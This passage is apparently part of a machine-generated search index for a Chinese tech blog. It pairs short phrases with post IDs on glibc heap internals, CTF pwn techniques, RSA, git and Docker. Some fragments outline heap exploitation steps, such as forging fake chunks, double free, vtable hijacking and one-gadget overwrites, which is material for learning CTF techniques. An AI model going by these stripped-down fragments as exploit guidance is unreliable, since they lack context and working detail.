":1,\"498\":1}}],[\"连leak\",{\"1\":{\"299\":1}}],[\"连pip都下载不起\",{\"1\":{\"262\":1}}],[\"昨天做vctf被打自闭了\",{\"1\":{\"299\":1}}],[\"​\",{\"1\":{\"298\":1,\"356\":1,\"365\":1,\"446\":1}}],[\"把b包含在合并后的大chunk中\",{\"1\":{\"488\":1}}],[\"把变量名字改改\",{\"1\":{\"459\":1}}],[\"把fake\",{\"1\":{\"446\":1}}],[\"把中间的chunk忽略掉\",{\"1\":{\"296\":1}}],[\"把消息写回客户端\",{\"1\":{\"254\":1}}],[\"把消息打印到标准输出\",{\"1\":{\"254\":1}}],[\"ⅱ\",{\"1\":{\"296\":1}}],[\"ⅰ\",{\"1\":{\"296\":1}}],[\"脱链\",{\"1\":{\"296\":1}}],[\"检查size是否对得上\",{\"1\":{\"362\":1}}],[\"检查double\",{\"1\":{\"339\":1}}],[\"检查unsortedbin是否合法\",{\"1\":{\"324\":1}}],[\"检查是否等于头一个chunk\",{\"1\":{\"324\":1}}],[\"检查fastbin的头部chunk是否为当前free的chunk\",{\"1\":{\"324\":1}}],[\"检查第一个chunk的bk是否为unsorted\",{\"1\":{\"321\":1}}],[\"检查当前chunk是否是free的\",{\"1\":{\"312\":1}}],[\"检查bck的fd是否为当前chunk\",{\"1\":{\"312\":1}}],[\"检查next\",{\"1\":{\"312\":1}}],[\"检查\",{\"1\":{\"296\":1}}],[\"检查下一个chunk的prev\",{\"1\":{\"296\":1}}],[\"检测对方是否存在\",{\"1\":{\"13\":1,\"155\":1}}],[\"待脱链的空闲chunk的指针\",{\"1\":{\"295\":1}}],[\"宏定义\",{\"1\":{\"295\":1}}],[\"明确一下对象双向链表\",{\"1\":{\"295\":1}}],[\"构造成功两个fastbin的情况\",{\"1\":{\"491\":1}}],[\"构造两个fastbin的情况\",{\"1\":{\"491\":1}}],[\"构造到malloc\",{\"1\":{\"488\":1}}],[\"构造栈\",{\"1\":{\"483\":1}}],[\"构造double\",{\"1\":{\"475\":2,\"490\":1}}],[\"构造时将vatble填写\",{\"1\":{\"384\":1}}],[\"构造一个double\",{\"1\":{\"378\":1,\"500\":1}}],[\"构造一个chunkheader\",{\"1\":{\"363\":1}}],[\"构造合并chunk\",{\"0\":{\"368\":1}}],[\"构造bk\",{\"0\":{\"367\":1},\"1\":{\"369\":1}}],[\"构造fastbin\",{\"1\":{\"503\":1}}],[\"构造fakecchunk\",{\"0\":{\"377\":1,\"499\":1}}],[\"构造fake\",{\"1\":{\"358\":1,\"359\":1,\"369\":1}}],[\"构造fd\",{\"0\":{\"366\":1},\"1\":{\"369\":1}}],[\"构造chunk\",{\"0\":{\"365\":1}}],[\"构造的chunk\",{\"1\":{\"358\":1,\"359\":1}}],[\"构造heap\",{\"1\":{\"294\":1}}],[\"构建指定版本libc的docker\",{\"0\":{\"256\":1}}],[\"马上free了\",{\"1\":{\"293\":1}}],[\"查找关键结构体\",{\"1\":{\"292\":1}}],[\"查看相关引用\",{\"1\":{\"460\":1}}],[\"查看程序当前信息\",{\"0\":{\"455\":1}}],[\"查看offset是否在这个区间范围之内\",{\"1\":{\"428\":1}}],[\"查看\",{\"1\":{\"417\":1}}],[\"查看list\",{\"1\":{\"417\":1}}],[\"查看一下偏移\",{\"1\":{\"390\":1}}],[\"查看glibc的源码网址\",{\"1\":{\"331\":1}}],[\"查看下一个chunk是否大于整个内存空间的边界\",{\"1\":{\"324\":1}}],[\"查看unsortedbin的大小\",{\"1\":{\"311\":1}}],[\"查看future是否有值\",{\"1\":{\"280\":1}}],[\"查看future是否已经被取消了\",{\"1\":{\"280\":1}}],[\"查看正在执行的容器\",{\"1\":{\"258\":1}}],[\"查看镜像\",{\"1\":{\"258\":1}}],[\"查看目前top顶部的activity\",{\"1\":{\"134\":1}}],[\"查看加载的驱动\",{\"1\":{\"73\":1,\"213\":1}}],[\"脚本\",{\"0\":{\"290\":1,\"369\":1,\"462\":1,\"475\":1,\"479\":1,\"491\":1}}],[\"原本会遍历所有的file结构体依次执行overflow函数\",{\"1\":{\"384\":1}}],[\"原理3\",{\"1\":{\"446\":1}}],[\"原理脚本\",{\"0\":{\"397\":1}}],[\"原理细学习\",{\"0\":{\"381\":1}}],[\"原理很简单\",{\"1\":{\"375\":1,\"497\":1}}],[\"原理\",{\"0\":{\"289\":1,\"357\":1},\"1\":{\"446\":1}}],[\"原创\",{\"1\":{\"46\":1,\"186\":1,\"372\":1,\"382\":1,\"393\":1,\"397\":1,\"494\":1}}],[\"另一个为0x110\",{\"1\":{\"287\":1}}],[\"另一方必须等待\",{\"1\":{\"13\":1,\"155\":1}}],[\"指令的地址\",{\"1\":{\"449\":1}}],[\"指令\",{\"1\":{\"446\":1}}],[\"指令来查看对应地址\",{\"1\":{\"287\":1}}],[\"指针\",{\"1\":{\"401\":1}}],[\"指针常量本质是常量\",{\"1\":{\"399\":1}}],[\"指针为char类型\",{\"1\":{\"292\":1}}],[\"指向一个指针的指针\",{\"1\":{\"458\":1}}],[\"指向将被传递给\",{\"1\":{\"458\":1}}],[\"指向将由新线程执行的函数的函数指针\",{\"1\":{\"458\":1}}],[\"指向\",{\"1\":{\"458\":2}}],[\"指向上一个chunk\",{\"1\":{\"438\":1}}],[\"指向下一个free\",{\"1\":{\"441\":1}}],[\"指向下一个chunk\",{\"1\":{\"438\":1}}],[\"指向下一个可用的位置\",{\"1\":{\"426\":1}}],[\"指向heap\",{\"1\":{\"438\":1}}],[\"指向chunk链表头部\",{\"1\":{\"438\":1}}],[\"指向chunk3\",{\"1\":{\"366\":1}}],[\"指向的是一个类型为\",{\"1\":{\"401\":1}}],[\"指向的是否是p\",{\"1\":{\"296\":1}}],[\"指向我们想要malloc的地址\",{\"1\":{\"475\":1}}],[\"指向我们的fake\",{\"1\":{\"366\":1}}],[\"指向我们伪造的chunk\",{\"1\":{\"365\":1}}],[\"指向我们我们stack里面的空间\",{\"1\":{\"306\":1}}],[\"指定free\",{\"1\":{\"380\":1,\"502\":1}}],[\"指定版本\",{\"1\":{\"256\":1}}],[\"指定服务器是否应尝试协商每个邮件压缩\",{\"1\":{\"254\":1}}],[\"被free的chunk的上一块chunk是free\",{\"1\":{\"343\":1}}],[\"被释放后\",{\"1\":{\"284\":1}}],[\"被创建\",{\"1\":{\"8\":1,\"150\":1}}],[\"作为参数传入asyncio\",{\"1\":{\"282\":1}}],[\"启动\",{\"1\":{\"282\":1}}],[\"启动并且附带脚本\",{\"1\":{\"118\":1}}],[\"基本使用\",{\"0\":{\"282\":1}}],[\"基本信息\",{\"1\":{\"141\":1}}],[\"基础对象\",{\"0\":{\"278\":1}}],[\"网络程序\",{\"1\":{\"277\":1}}],[\"网站是看的这个\",{\"1\":{\"22\":1,\"164\":1}}],[\"理解理解\",{\"1\":{\"304\":1}}],[\"理解\",{\"1\":{\"277\":1}}],[\"技术揭秘\",{\"1\":{\"277\":1}}],[\"技术论坛\",{\"1\":{\"253\":1}}],[\"掉revert我merge\",{\"1\":{\"275\":1}}],[\"还有个和这个很相似的变量\",{\"1\":{\"453\":1}}],[\"还有一种是revert\",{\"1\":{\"274\":1}}],[\"还任然留在了原地\",{\"1\":{\"446\":1}}],[\"还包含了大量相关业务\",{\"1\":{\"252\":1}}],[\"逆向commit\",{\"1\":{\"273\":1}}],[\"逆元\",{\"1\":{\"240\":1}}],[\"旨在跟踪文件的每个版本\",{\"1\":{\"273\":1}}],[\"于是还是写上\",{\"1\":{\"272\":1}}],[\"于是学习一下如何用git安全地去除\",{\"1\":{\"272\":1}}],[\"优先寻找dt\",{\"1\":{\"453\":1}}],[\"优先取\",{\"1\":{\"358\":1}}],[\"优先取第二个\",{\"1\":{\"321\":1}}],[\"优雅的去除这个bug\",{\"1\":{\"272\":1}}],[\"优点\",{\"1\":{\"43\":1,\"183\":1}}],[\"目的\",{\"0\":{\"272\":1}}],[\"目前仅支持\",{\"1\":{\"254\":1}}],[\"目前linux\",{\"1\":{\"73\":1,\"213\":1}}],[\"说明初始值是feifei\",{\"1\":{\"460\":1}}],[\"说明所有的\",{\"1\":{\"403\":1}}],[\"说明你的pr的作用\",{\"1\":{\"270\":1}}],[\"说明intent\",{\"1\":{\"140\":1}}],[\"良好的审查机制\",{\"1\":{\"269\":1}}],[\"良好的代码提交规范可以帮助团队成员更好地理解和维护代码库\",{\"1\":{\"263\":1}}],[\"顺便可以提供上下文信息\",{\"1\":{\"266\":1}}],[\"修复问题的编号\",{\"1\":{\"270\":1}}],[\"修复bug\",{\"1\":{\"268\":1}}],[\"修复登录页面显示问题\",{\"1\":{\"266\":1}}],[\"修改其fd\",{\"1\":{\"488\":1}}],[\"修改malloc\",{\"1\":{\"474\":1,\"475\":1}}],[\"修改libc的地址\",{\"1\":{\"456\":2}}],[\"修改ld的地址\",{\"1\":{\"456\":1}}],[\"修改程序的\",{\"0\":{\"456\":1}}],[\"修改这两个值就可以实现任意地址的修改\",{\"1\":{\"431\":1}}],[\"修改值\",{\"1\":{\"417\":1}}],[\"修改思路\",{\"0\":{\"359\":1}}],[\"修改比较方便不需要牵一发而动全身\",{\"1\":{\"246\":1}}],[\"修改每个对象的字段\",{\"1\":{\"125\":1}}],[\"修改非静态字段\",{\"1\":{\"125\":1}}],[\"修改静态字段\",{\"1\":{\"125\":1}}],[\"修改类字段\",{\"1\":{\"125\":1}}],[\"修改类的字段\",{\"0\":{\"125\":1}}],[\"修改参数\",{\"1\":{\"121\":1,\"123\":1}}],[\"修改io\",{\"1\":{\"59\":1,\"199\":1}}],[\"修改cs寄存器的值\",{\"1\":{\"42\":1,\"182\":1}}],[\"修改syscall\",{\"1\":{\"40\":1,\"180\":1}}],[\"修改再单独拷贝\",{\"1\":{\"8\":1,\"150\":1}}],[\"功能\",{\"1\":{\"265\":1}}],[\"添加用户注册功能\",{\"1\":{\"265\":1}}],[\"描述清楚修改的内容\",{\"1\":{\"266\":1}}],[\"描述\",{\"1\":{\"263\":1,\"265\":1}}],[\"描述一个内存区域的开始结束\",{\"1\":{\"77\":1,\"217\":1}}],[\"格式\",{\"0\":{\"265\":1}}],[\"格式为\",{\"1\":{\"263\":1}}],[\"格式化字符串\",{\"0\":{\"39\":1,\"179\":1}}],[\"尽量保持提交频率较小\",{\"1\":{\"263\":1}}],[\"尽量避免使用那些多变的具体实现类\",{\"1\":{\"252\":1}}],[\"关于\",{\"1\":{\"397\":3}}],[\"关于git的规范\",{\"1\":{\"263\":1}}],[\"关联的线程个数\",{\"1\":{\"347\":1}}],[\"关闭套接字可以释放资源\",{\"1\":{\"4\":1,\"147\":1}}],[\"关闭套接字是一个必要的操作\",{\"1\":{\"4\":1,\"147\":1}}],[\"浅学习io\",{\"0\":{\"398\":1}}],[\"浅学习1\",{\"0\":{\"263\":1}}],[\"浅copy是复制对象的指针\",{\"1\":{\"30\":1,\"172\":1}}],[\"浅copy\",{\"0\":{\"30\":1,\"172\":1}}],[\"支持多版本共存\",{\"1\":{\"262\":1}}],[\"各个链的chunk\",{\"1\":{\"491\":1}}],[\"各page的信息\",{\"1\":{\"438\":1}}],[\"各版本的轻量级pwn环境\",{\"0\":{\"262\":1}}],[\"各层之间单向依赖\",{\"1\":{\"252\":1}}],[\"找出程序依赖的所有共享库\",{\"1\":{\"454\":1}}],[\"找了很多文章都没有解决\",{\"1\":{\"261\":1}}],[\"找到了大佬的blog感觉摸到了皮毛\",{\"1\":{\"398\":1}}],[\"找到刚好大于等于我们所需chunk\",{\"1\":{\"321\":1}}],[\"找到我们需要的libc版本进行下载即可\",{\"1\":{\"262\":1}}],[\"找到解决文章\",{\"1\":{\"258\":1}}],[\"找到一个e\",{\"1\":{\"240\":1}}],[\"找到rcs文件\",{\"1\":{\"73\":1,\"213\":1}}],[\"镜像名称\",{\"1\":{\"258\":1}}],[\"镜像的标识\",{\"1\":{\"258\":1}}],[\"容器启动后直接进入命令行\",{\"1\":{\"258\":1}}],[\"容器名称\",{\"1\":{\"258\":1}}],[\"容器端口\",{\"1\":{\"258\":1}}],[\"宿主机端口\",{\"1\":{\"258\":1}}],[\"9个128\",{\"1\":{\"372\":1,\"494\":1}}],[\"94\",{\"1\":{\"261\":4}}],[\"936a687b2420\",{\"1\":{\"261\":2}}],[\"9\",{\"1\":{\"258\":1,\"262\":1,\"373\":2,\"461\":1,\"475\":6,\"495\":2,\"503\":8}}],[\"9mb\",{\"1\":{\"258\":1}}],[\"9527\",{\"1\":{\"261\":4}}],[\"95\",{\"1\":{\"1\":1}}],[\"怪\",{\"1\":{\"258\":1}}],[\"自动跳转plt\",{\"1\":{\"449\":1}}],[\"自动就好了\",{\"1\":{\"258\":1}}],[\"自然对齐性能利用率高\",{\"1\":{\"12\":1,\"154\":1}}],[\"继续报错\",{\"1\":{\"258\":1}}],[\"继承\",{\"1\":{\"252\":1}}],[\"桌面版报错error\",{\"1\":{\"258\":1}}],[\"版本\",{\"0\":{\"300\":1}}],[\"版本对应\",{\"0\":{\"257\":1}}],[\"版本号\",{\"1\":{\"141\":1}}],[\"命令行参数处理以及读取和解析数据至关重要\",{\"1\":{\"466\":1}}],[\"命令详解\",{\"1\":{\"256\":1}}],[\"命令可以从\",{\"1\":{\"73\":1,\"213\":1}}],[\"降级\",{\"1\":{\"256\":1}}],[\"复现它的操作发现它的libc版本太低了\",{\"1\":{\"256\":1}}],[\"浏览\",{\"1\":{\"255\":1}}],[\"按照栈顶依次选择\",{\"1\":{\"476\":1}}],[\"按照e\",{\"1\":{\"243\":1}}],[\"按固定大小切好的small内存槽\",{\"1\":{\"438\":1}}],[\"按顺序指定服务支持的协议\",{\"1\":{\"254\":1}}],[\"握手完成的超时时间\",{\"1\":{\"254\":1}}],[\"升级\",{\"1\":{\"254\":1}}],[\"方便我们理解我们patchelf要修改哪些东西\",{\"1\":{\"453\":1}}],[\"方便我们取出名字\",{\"1\":{\"451\":1}}],[\"方便我们了解\",{\"1\":{\"449\":1}}],[\"方便我们直观看见\",{\"1\":{\"402\":1}}],[\"方便我们进行调用\",{\"1\":{\"401\":1}}],[\"方便我们进行处理\",{\"1\":{\"401\":1}}],[\"方便我们去劫持exit\",{\"1\":{\"378\":1,\"500\":1}}],[\"方便我们去分析源码\",{\"1\":{\"139\":1}}],[\"方便以后查看\",{\"1\":{\"275\":1}}],[\"方法将给定的响应状态码和响应header一起发送出去\",{\"1\":{\"254\":1}}],[\"向上\",{\"1\":{\"464\":1}}],[\"向上搜索字符串\",{\"1\":{\"464\":1}}],[\"向上滚动一页\",{\"1\":{\"464\":1}}],[\"向上申请内存\",{\"1\":{\"327\":1}}],[\"向下\",{\"1\":{\"464\":1}}],[\"向下搜索字符串\",{\"1\":{\"464\":1}}],[\"向下滚动一页\",{\"1\":{\"464\":1}}],[\"向下翻页\",{\"1\":{\"464\":1}}],[\"向top\",{\"1\":{\"330\":1}}],[\"向docker内部传文件\",{\"1\":{\"258\":1}}],[\"向网络链接中写响应数据\",{\"1\":{\"254\":1}}],[\"向管道\",{\"1\":{\"13\":1,\"155\":1}}],[\"服务\",{\"1\":{\"253\":1}}],[\"尼玛就不要让他们直接产生相互作用\",{\"1\":{\"252\":1}}],[\"迪米特法则\",{\"1\":{\"252\":1}}],[\"子线程只能用mmap函数\",{\"1\":{\"327\":1}}],[\"子类型必须能够替换到他们的父类型\",{\"1\":{\"252\":1}}],[\"子进程会获取父进程的所有文件副本\",{\"1\":{\"16\":1,\"158\":1}}],[\"子进程会让所有文件描述符copy下来\",{\"1\":{\"4\":1,\"147\":1}}],[\"稳定依赖原则\",{\"1\":{\"252\":1}}],[\"面向接口进行编程而不是面对实现\",{\"1\":{\"252\":1}}],[\"面试技巧\",{\"0\":{\"23\":1,\"165\":1}}],[\"面试准备\",{\"0\":{\"2\":1,\"145\":1}}],[\"里氏代换\",{\"1\":{\"252\":2}}],[\"抽象\",{\"1\":{\"252\":1}}],[\"胀血模型\",{\"1\":{\"252\":2}}],[\"充血模型\",{\"1\":{\"252\":2}}],[\"充血模型和胀血模型详细解读和代码案例说明\",{\"1\":{\"252\":1}}],[\"充血模型和胀血模型\",{\"0\":{\"252\":1}}],[\"领域驱动设计\",{\"1\":{\"252\":1}}],[\"领航杯2019的一道题\",{\"1\":{\"243\":1}}],[\"贫血模型\",{\"0\":{\"252\":1},\"1\":{\"252\":3}}],[\"都不是特别好使hhh\",{\"1\":{\"452\":1}}],[\"都需要内嵌\",{\"1\":{\"252\":1}}],[\"都需要在a初始化的时候再多传入一个类\",{\"1\":{\"250\":1}}],[\"都是受到heap结构体管理\",{\"1\":{\"50\":1,\"190\":1}}],[\"都是处于内核空间的\",{\"1\":{\"43\":1,\"183\":1}}],[\"报纸c\",{\"1\":{\"250\":1}}],[\"哔哩哔哩\",{\"1\":{\"250\":1}}],[\"你分得清楚吗\",{\"1\":{\"250\":1}}],[\"订阅模式\",{\"1\":{\"250\":1}}],[\"发生了其他错误\",{\"1\":{\"255\":1}}],[\"发布说明\",{\"1\":{\"270\":1}}],[\"发布订阅模式\",{\"0\":{\"251\":1}}],[\"发布\",{\"1\":{\"250\":1}}],[\"发现不太现实\",{\"1\":{\"482\":1}}],[\"发现了import无效指令\",{\"1\":{\"463\":1}}],[\"发现主要用在加密input上面\",{\"1\":{\"460\":1}}],[\"发现frida在新版本中移除了\",{\"1\":{\"131\":1}}],[\"发现其实readme也比较重要\",{\"1\":{\"105\":1}}],[\"给你的批阅者的特别注意事项\",{\"1\":{\"270\":1}}],[\"给用户显示出来\",{\"1\":{\"248\":1}}],[\"给该调用者\",{\"1\":{\"8\":1,\"150\":1}}],[\"观察者模型\",{\"0\":{\"250\":1}}],[\"观察者模式一般是解决这样的场景的\",{\"1\":{\"250\":1}}],[\"观察者模式后面详细解释\",{\"1\":{\"247\":1}}],[\"观察者模式\",{\"1\":{\"247\":1,\"250\":1}}],[\"观察堆栈\",{\"1\":{\"42\":1,\"182\":1}}],[\"框架内部的代码复用性差\",{\"1\":{\"246\":1}}],[\"层级之间不相互依赖\",{\"1\":{\"246\":1}}],[\"徐浩进\",{\"1\":{\"246\":1}}],[\"模拟\",{\"1\":{\"503\":1}}],[\"模式\",{\"1\":{\"254\":1}}],[\"模式为了减少代码重复\",{\"1\":{\"252\":1}}],[\"模式中违反了这一条\",{\"1\":{\"252\":1}}],[\"模块之间难以复用\",{\"1\":{\"245\":1}}],[\"模反元素\",{\"1\":{\"240\":1}}],[\"本地bss没有可执行权限但是远程有\",{\"1\":{\"485\":1}}],[\"本地打这个感觉还行\",{\"1\":{\"380\":1,\"502\":1}}],[\"本地地址\",{\"1\":{\"258\":2}}],[\"本来想的是每次用两字节操作两字节跳转到下一个可执行区域\",{\"1\":{\"482\":1}}],[\"本来想着偷偷懒有一些东西都没去多想\",{\"1\":{\"245\":1}}],[\"本来不足以写成一篇博文的\",{\"1\":{\"272\":1}}],[\"本质websocket还是用的tcp进行读取与写入\",{\"1\":{\"253\":1}}],[\"本质也就是先用一个数组来存每个进程的空闲文件描述符数组\",{\"1\":{\"15\":1,\"157\":1}}],[\"本blog只是对这个文章中的一些专业名词进行一个解释\",{\"1\":{\"244\":1}}],[\"项目上传一个commit\",{\"1\":{\"272\":1}}],[\"项目提交规范学习\",{\"0\":{\"263\":1}}],[\"项目的可演进性\",{\"1\":{\"244\":1}}],[\"项目的可测试性\",{\"1\":{\"244\":1}}],[\"项目背景\",{\"0\":{\"107\":1}}],[\"设计原则\",{\"1\":{\"244\":1}}],[\"设置\",{\"1\":{\"417\":1}}],[\"设置为fake\",{\"1\":{\"397\":2}}],[\"设置为\",{\"1\":{\"397\":1}}],[\"设置为1\",{\"1\":{\"397\":1}}],[\"设置为null\",{\"1\":{\"321\":1}}],[\"设置一个size到原本size的地方\",{\"1\":{\"365\":1,\"369\":1}}],[\"设置一个future完成时候要触发的回调函数\",{\"1\":{\"280\":1}}],[\"设置进程关联个数\",{\"1\":{\"353\":1}}],[\"设置nextchunk\",{\"1\":{\"324\":1}}],[\"设置下一个chunk\",{\"1\":{\"321\":1}}],[\"设置异常\",{\"1\":{\"280\":1}}],[\"设置future的值\",{\"1\":{\"280\":1}}],[\"设置局部变量\",{\"1\":{\"47\":2,\"187\":2}}],[\"设置栈底帧\",{\"1\":{\"47\":1,\"187\":1}}],[\"架构的重要性\",{\"1\":{\"244\":1}}],[\"架构下的\",{\"1\":{\"46\":1,\"186\":1}}],[\"私钥\",{\"1\":{\"240\":1}}],[\"私有密钥为\",{\"1\":{\"240\":1}}],[\"公钥文件\",{\"1\":{\"243\":1}}],[\"公钥\",{\"1\":{\"240\":1}}],[\"ｍe\",{\"1\":{\"240\":1}}],[\"≡\",{\"1\":{\"240\":2}}],[\"除了huge\",{\"1\":{\"438\":1}}],[\"除了1和它本身外\",{\"1\":{\"240\":1}}],[\"除的余数为1\",{\"1\":{\"240\":1}}],[\"φ\",{\"1\":{\"240\":3}}],[\"计算出key加密后的地址\",{\"1\":{\"380\":1,\"502\":1}}],[\"计算\",{\"1\":{\"287\":1,\"310\":1,\"312\":1}}],[\"计算e对于φ\",{\"1\":{\"240\":1}}],[\"计算n=p\",{\"1\":{\"240\":1}}],[\"计算方式\",{\"0\":{\"240\":1}}],[\"互质\",{\"1\":{\"240\":2}}],[\"互斥性\",{\"1\":{\"13\":1,\"155\":1}}],[\"由操作系统加载该文件\",{\"1\":{\"454\":1}}],[\"由libc\",{\"1\":{\"327\":1}}],[\"由大到小\",{\"1\":{\"319\":1}}],[\"由于信息都是通过head\",{\"1\":{\"490\":1}}],[\"由于有个gets函数\",{\"1\":{\"469\":1}}],[\"由于这题涉及多线程\",{\"1\":{\"461\":1}}],[\"由于这个是开发知识就不细讲了\",{\"1\":{\"124\":1}}],[\"由于已经对vtable进行了限制\",{\"1\":{\"429\":1}}],[\"由于要泄露tls+0x30处的地址\",{\"1\":{\"378\":1,\"500\":1}}],[\"由于是使用状态所以\",{\"1\":{\"329\":1}}],[\"由于是单链形式\",{\"1\":{\"286\":1}}],[\"由于定位bck是通过victim来确定的\",{\"1\":{\"306\":1}}],[\"由于前段时间做了hgame的week3的一道overlapping\",{\"1\":{\"302\":1}}],[\"由于对glibc高版本的保护不熟悉\",{\"1\":{\"299\":1}}],[\"由于做题的时候老是脑子不够用\",{\"1\":{\"288\":1}}],[\"由于linux中使用free\",{\"1\":{\"284\":1}}],[\"由于我是是第一次的调用\",{\"1\":{\"449\":1}}],[\"由于我们劫持了vtable\",{\"1\":{\"384\":1}}],[\"由于我们最大申请128\",{\"1\":{\"376\":1,\"498\":1}}],[\"由于我们是common\",{\"1\":{\"276\":1}}],[\"由于我的vmware中ubuntu再次崩溃了\",{\"1\":{\"259\":1}}],[\"由这几个组成\",{\"1\":{\"246\":1}}],[\"由高斯所命名\",{\"1\":{\"240\":1}}],[\"判断是否是fastbin范围\",{\"1\":{\"336\":1}}],[\"判断large是否有空闲chunk\",{\"1\":{\"319\":1}}],[\"判断最后的size是否小于0x20\",{\"1\":{\"289\":1}}],[\"判断素数\",{\"1\":{\"240\":1}}],[\"判断质数\",{\"1\":{\"240\":1}}],[\"判断的五种方法\",{\"1\":{\"240\":1}}],[\"质数\",{\"1\":{\"240\":2}}],[\"素数\",{\"1\":{\"240\":1}}],[\"欧拉定理\",{\"1\":{\"239\":1}}],[\"欧拉函数φ\",{\"1\":{\"240\":1}}],[\"欧拉函数\",{\"1\":{\"239\":1,\"240\":1}}],[\"为onegadget即可\",{\"1\":{\"474\":1}}],[\"为\",{\"1\":{\"385\":1}}],[\"为触发泄露tls+0x30的double\",{\"1\":{\"377\":1,\"499\":1}}],[\"为了实验一下\",{\"1\":{\"470\":1}}],[\"为了让编译器能够找到对应的动态库ld\",{\"1\":{\"453\":1}}],[\"为了深入\",{\"1\":{\"398\":1}}],[\"为了不影响后续的heap计算就没有删除\",{\"1\":{\"378\":1,\"500\":1}}],[\"为了绕过isused的检测\",{\"1\":{\"374\":1,\"496\":1}}],[\"为了图片干净一点\",{\"1\":{\"308\":1}}],[\"为了代码的可读性以及逻辑的连贯性\",{\"1\":{\"280\":1}}],[\"为了安全的\",{\"1\":{\"272\":1}}],[\"为主线\",{\"1\":{\"274\":1}}],[\"为质数\",{\"1\":{\"239\":1}}],[\"为什么要有虚拟内存\",{\"1\":{\"63\":1,\"203\":1}}],[\"为什么用rax间接传参\",{\"0\":{\"45\":1,\"185\":1}}],[\"费马小定理\",{\"1\":{\"239\":1}}],[\"🍬公钥密码\",{\"1\":{\"238\":1}}],[\"🍬对称密码\",{\"1\":{\"238\":1}}],[\"加0x8是因为这个位置放\",{\"1\":{\"505\":1}}],[\"加载共享库\",{\"1\":{\"454\":1}}],[\"加载到内存后\",{\"1\":{\"127\":1}}],[\"加减偏移\",{\"1\":{\"395\":1}}],[\"加上分配区锁\",{\"1\":{\"353\":1}}],[\"加入malloc\",{\"1\":{\"349\":1}}],[\"加密和解密使用不同的密码的方式\",{\"1\":{\"238\":1}}],[\"加密和解密使用同一种密钥的方式\",{\"1\":{\"238\":1}}],[\"但在分布式计算和量子计算机理论日趋成熟的今天\",{\"1\":{\"238\":1}}],[\"但是前五个isused为0\",{\"1\":{\"491\":1}}],[\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",{\"1\":{\"470\":1}}],[\"但是好像可以用命令行来解决这个问题比如我们这里用指令\",{\"1\":{\"445\":1}}],[\"但是功能较少\",{\"1\":{\"464\":1}}],[\"但是到了真正传输的时候是不需要http传输的\",{\"1\":{\"435\":1}}],[\"但是值得注意的是websocket是应用层协议而socket就是上文讲述的是传输层的协议\",{\"1\":{\"435\":1}}],[\"但是它指向的内容是不可变的\",{\"1\":{\"399\":1}}],[\"但是它们的使用方式和作用有所不同\",{\"1\":{\"4\":1,\"147\":1}}],[\"但是其实这里r\",{\"1\":{\"451\":1}}],[\"但是其实一直没有深度了解一下\",{\"1\":{\"432\":1}}],[\"但是其内容不可被修改\",{\"1\":{\"399\":1}}],[\"但是其还是使用的虚拟地址并且也要通过映射转化为物理地址\",{\"1\":{\"70\":1,\"210\":1}}],[\"但是指针指向的内容是可以修改的\",{\"1\":{\"399\":1}}],[\"但是打远程的时候我脚本足足要跑20分钟\",{\"1\":{\"380\":1,\"502\":1}}],[\"但是后面切换了思路没有用了\",{\"1\":{\"378\":1,\"500\":1}}],[\"但是同时也会导致缓冲区一堆数据导致后续的scanf失灵\",{\"1\":{\"376\":1,\"498\":1}}],[\"但是同时无法应对非常复杂的逻辑和场景\",{\"1\":{\"252\":1}}],[\"但是现在就要想办法触发fastbin中的合并机制了\",{\"1\":{\"375\":1,\"497\":1}}],[\"但是此时保留了fd\",{\"1\":{\"373\":1,\"495\":1}}],[\"但是为了方便理解我们选择倒推的方式\",{\"1\":{\"368\":1}}],[\"但是我忽略了\",{\"1\":{\"360\":1}}],[\"但是我感觉以后我可能忘记\",{\"1\":{\"272\":1}}],[\"但是觉得还是学了东西\",{\"1\":{\"355\":1}}],[\"但是calloc是不会拿tcache的\",{\"1\":{\"340\":1}}],[\"但是没有清空\",{\"1\":{\"293\":1}}],[\"但是写太多bug了被revert了\",{\"1\":{\"275\":1}}],[\"但是这个commit带了bug\",{\"1\":{\"272\":1}}],[\"但是这样会导致类之间紧密耦合\",{\"1\":{\"250\":1}}],[\"但是ping\",{\"1\":{\"261\":1}}],[\"但是pwntools在本地是无法接受到这个的\",{\"1\":{\"18\":1,\"160\":1}}],[\"但是大大简化了代码的封层结构\",{\"1\":{\"252\":1}}],[\"但是不依赖dao层\",{\"1\":{\"252\":1}}],[\"但是频繁这样做随意去依赖其他模块会导致模块之间依赖极其混乱\",{\"1\":{\"245\":1}}],[\"但是还记得我们最开始说的吗\",{\"1\":{\"241\":1}}],[\"但是想要对其乘积进行因式分解却极其困难\",{\"1\":{\"238\":1}}],[\"但是r1的值不改变\",{\"1\":{\"47\":1,\"187\":1}}],[\"但是用户可以直接访问内核\",{\"1\":{\"43\":1,\"183\":1}}],[\"但是如果func2中对a进行操作就是对a的备份进行操作无法修改原本的值\",{\"1\":{\"24\":1,\"166\":1}}],[\"但是在各个任务之间来回切换\",{\"1\":{\"14\":1,\"156\":1}}],[\"但是物理空间不一定连续\",{\"1\":{\"10\":1,\"152\":1}}],[\"但是会导致需要修改4个节点之类\",{\"1\":{\"8\":1,\"150\":1}}],[\"世界上还没有任何可靠的攻击rsa算法的方式\",{\"1\":{\"238\":1}}],[\"今天只有短的rsa钥匙才可能被强力方式解破\",{\"1\":{\"238\":1}}],[\"已分配chunk数\",{\"1\":{\"438\":1}}],[\"已经完成覆写\",{\"1\":{\"377\":1,\"499\":1}}],[\"已经知道\",{\"1\":{\"395\":1}}],[\"已经知道n比较小\",{\"1\":{\"243\":1}}],[\"已经知道p\",{\"1\":{\"243\":1}}],[\"已经知道e和phi\",{\"1\":{\"242\":1}}],[\"已知\",{\"1\":{\"243\":1}}],[\"已知密文文件\",{\"1\":{\"243\":1}}],[\"已被iso推荐为公钥数据加密标准\",{\"1\":{\"238\":1}}],[\"已有chunk大小\",{\"1\":{\"57\":1,\"197\":1}}],[\"阿里云开发者社区\",{\"1\":{\"263\":1}}],[\"阿德曼\",{\"1\":{\"238\":1}}],[\"阿迪\",{\"1\":{\"238\":1}}],[\"萨莫尔\",{\"1\":{\"238\":1}}],[\"李维斯特\",{\"1\":{\"238\":1}}],[\"背景\",{\"0\":{\"238\":1}}],[\"背景和动机是什么\",{\"1\":{\"107\":1}}],[\"定义了一些activity的执行方式\",{\"1\":{\"143\":1}}],[\"定义了android\",{\"1\":{\"143\":1}}],[\"往往一些实际项目中我们xml文件中有多个activity标签\",{\"1\":{\"142\":1}}],[\"尤其是activity我们一般都是从activity分析起走\",{\"1\":{\"141\":1}}],[\"列如\",{\"1\":{\"265\":1}}],[\"列举几个逆向中常用的属性\",{\"1\":{\"